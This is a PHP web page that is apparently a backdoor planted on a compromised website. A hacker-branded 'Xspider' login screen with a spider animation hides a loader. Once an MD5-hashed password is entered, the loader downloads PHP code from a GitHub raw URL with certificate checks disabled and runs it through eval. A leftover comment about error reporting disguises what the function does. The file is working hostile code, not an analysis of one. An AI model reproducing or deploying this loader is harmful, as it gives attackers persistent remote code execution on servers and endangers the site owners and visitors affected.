<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);


        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}


function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}


if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '37bd8d4f5adc469f75bdc73b2f8edccc';
    if (md5($entered_password) === $hashed_password) {

        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu';
    } else {

        echo "Incorrect password. Please try again.";
    }
}


if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpa.php');
    eval('?>' . $a);
} else {

    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>..:: myblooket.com ::.. - Xspider Access</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
    <style>
  
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            
            background: radial-gradient(circle at top, #150000, #000000);
            font-family: 'Orbitron', Arial, sans-serif;
            overflow: hidden;
            color: #fff;
        }


        .neon-bg {
            position: absolute;
            width: 600px;
            height: 600px;

            background: radial-gradient(circle, rgba(255,0,0,0.15), transparent 70%);
            animation: pulse 6s linear infinite;
        }

        @keyframes pulse {
            0% { transform: scale(0.8); opacity: .4; }
            50% { transform: scale(1.1); opacity: .7; }
            100% { transform: scale(0.8); opacity: .4; }
        }


        .wrapper {
            position: relative;
            backdrop-filter: blur(12px);
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(255, 0, 0, 0.4);
            border-radius: 25px;
            padding: 30px 40px 40px;
            width: 420px;
            text-align: center;
            box-shadow: 0 0 25px rgba(255, 0, 0, 0.6);
            animation: floatIn 1.4s ease forwards;
            opacity: 0;
            z-index: 10;
        }

        @keyframes floatIn {
            from { transform: translateY(-40px) scale(0.95); opacity: 0; }
            to { transform: translateY(0) scale(1); opacity: 1; }
        }


        .logo {
            width: 180px;
            height: 180px;
            border-radius: 50%;
            object-fit: cover;
            box-shadow: 0 0 25px red;
            margin: 0 auto 15px;
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { box-shadow: 0 0 10px red; }
            to { box-shadow: 0 0 30px red; }
        }


        #typedtext {
            margin: 10px 0 25px;
            font-size: 18px;
            letter-spacing: 2px;
            color: #ff2a2a;
            border-right: 2px solid red;
            white-space: nowrap;
            overflow: hidden;
            animation: blink 0.8s infinite;
        }

        @keyframes blink {
            0%,100% { border-color: red; }
            50% { border-color: transparent; }
        }


        .form-group {
            margin-top: 10px;
        }

        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            background: rgba(0,0,0,0.8);
            border: 1px solid #ff0000;
            border-radius: 50px;
            outline: none;
            color: #fff;
            font-size: 14px;
            transition: all .3s ease;
            font-family: 'Orbitron', Arial, sans-serif;
        }

        input[type="password"]:focus {
            box-shadow: 0 0 10px #ff0000;
            background: rgba(40,0,0,0.9);
        }

        button {
            margin-top: 20px;
            width: 100%;
            padding: 12px;
            border-radius: 50px;
            border: none;
            background: linear-gradient(45deg, #ff0000, #7a0000);
            color: #fff;
            font-weight: bold;
            letter-spacing: 2px;
            cursor: pointer;
            transition: transform .3s ease, box-shadow .3s ease;
            font-family: 'Orbitron', Arial, sans-serif;
        }

        button:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 0 15px red;
        }

        footer {
            margin-top: 15px;
            font-size: 11px;
            color: rgba(255,255,255,0.4);
        }


        #spiderCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
    </style>
</head>
<body>

<div class="neon-bg"></div>

<div class="wrapper">
    <img src="https://i.gyazo.com/18dd016d2df5131a4d6d6f3ad7e680d8.png" class="logo" draggable="false" alt="Spiderman Logo">

    <div id="typedtext"></div>

    <form method="post">
        <input type="hidden" name="action" value="login">
        <div class="form-group">
            <input type="password" name="password" placeholder="Enter password..." required>
        </div>
        <button type="submit">LOGIN ACCESS</button>
    </form>

    <footer>myblooket secure portal</footer>
</div>

<script>
    const text = "Xspider Joins the Party";
    const speed = 40;
    let i = 0;
    const typedtext = document.getElementById("typedtext");

    function typeWriter() {
        if (i < text.length) {
            typedtext.innerHTML += text.charAt(i);
            i++;
            setTimeout(typeWriter, speed);
        }
    }

    window.onload = typeWriter;
</script>


<canvas id="spiderCanvas"></canvas>

<script>
    const canvas = document.getElementById('spiderCanvas');
    const ctx = canvas.getContext('2d');

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    let spiders = [];
    const spiderCount = 45;


    class Spider {
        constructor() {
            this.x = Math.random() * canvas.width;
            this.y = Math.random() * canvas.height;
            this.size = Math.random() * 2 + 1;
            this.speedX = (Math.random() - 0.5) * 0.6;
            this.speedY = (Math.random() - 0.5) * 0.6;
        }

        draw() {
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            ctx.fillStyle = 'rgba(255,0,0,0.6)';
            ctx.fill();
        }

        update() {
            this.x += this.speedX;
            this.y += this.speedY;

            if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
            if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;

            this.draw();
        }
    }

    function initSpiders() {
        spiders = [];
        for (let i = 0; i < spiderCount; i++) {
            spiders.push(new Spider());
        }
    }

    function connectSpiders() {
        for (let i = 0; i < spiders.length; i++) {
            for (let j = i; j < spiders.length; j++) {
                let dx = spiders[i].x - spiders[j].x;
                let dy = spiders[i].y - spiders[j].y;
                let distance = Math.sqrt(dx * dx + dy * dy);
                if (distance < 150) {
                    ctx.beginPath();
                    ctx.strokeStyle = 'rgba(255,0,0,0.25)';
                    ctx.lineWidth = 0.5;
                    ctx.moveTo(spiders[i].x, spiders[i].y);
                    ctx.lineTo(spiders[j].x, spiders[j].y);
                    ctx.stroke();
                }
            }
        }
    }


    let bigSpiders = [];

    class BigSpider {
        constructor() {
            this.x = Math.random() * canvas.width;
            this.y = -100;
            this.size = Math.random() * 15 + 15;
            this.speed = Math.random() * 0.8 + 0.5;
            this.swing = Math.random() * Math.PI * 2;
        }

        draw() {

            ctx.beginPath();
            ctx.strokeStyle = 'rgba(255,0,0,0.4)'; 
            ctx.moveTo(this.x, 0);
            ctx.lineTo(this.x, this.y);
            ctx.lineWidth = 1;
            ctx.stroke();


            ctx.beginPath();
            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            ctx.fillStyle = 'rgba(10, 10, 10, 0.9)';
            ctx.shadowColor = 'red';
            ctx.shadowBlur = 10;
            ctx.fill();
            ctx.shadowBlur = 0;


            for (let i = 0; i < 8; i++) {
                let angle = (Math.PI / 4) * i + this.swing * 0.5;
                ctx.beginPath();
                ctx.moveTo(this.x, this.y);
                ctx.lineTo(
                    this.x + Math.cos(angle) * this.size * 1.5,
                    this.y + Math.sin(angle) * this.size * 1.5
                );
                ctx.strokeStyle = 'rgba(255,0,0,0.5)';
                ctx.lineWidth = 1;
                ctx.stroke();
            }
        }

        update() {
            this.y += this.speed;
            this.swing += 0.03;
            this.x += Math.sin(this.swing) * 0.8;
            this.draw();

            if (this.y > canvas.height + 100) {
                this.y = -150;
                this.x = Math.random() * canvas.width;
            }
        }
    }

    function spawnBigSpider() {
        if (bigSpiders.length < 5) {
            bigSpiders.push(new BigSpider());
        }
    }


    setInterval(spawnBigSpider, 3000);


    function enhancedAnimate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
 
        spiders.forEach(spider => spider.update());
        connectSpiders();
        

        bigSpiders.forEach(spider => spider.update());
        
        requestAnimationFrame(enhancedAnimate);
    }

 
    initSpiders();
    enhancedAnimate();


    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        initSpiders();
    });
</script>

</body>
</html>
    <?php
}
?>
